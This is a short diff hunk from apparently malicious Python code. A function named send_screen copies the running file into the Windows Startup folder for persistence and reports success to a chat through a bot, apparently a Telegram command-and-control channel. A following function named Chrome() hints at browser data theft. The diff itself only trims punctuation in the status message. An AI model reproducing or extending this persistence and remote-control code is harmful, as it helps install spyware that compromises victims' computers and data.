@@ -48,7 +48,7 @@ def send_screen(command) :
     user_path = os.path.expanduser('~') 
     if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
         os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-    bot.send_message(chat_id, "Successfully to Autostart!!!") 
+    bot.send_message(chat_id, "Successfully to Autostart!") 
 
 
 def Chrome():
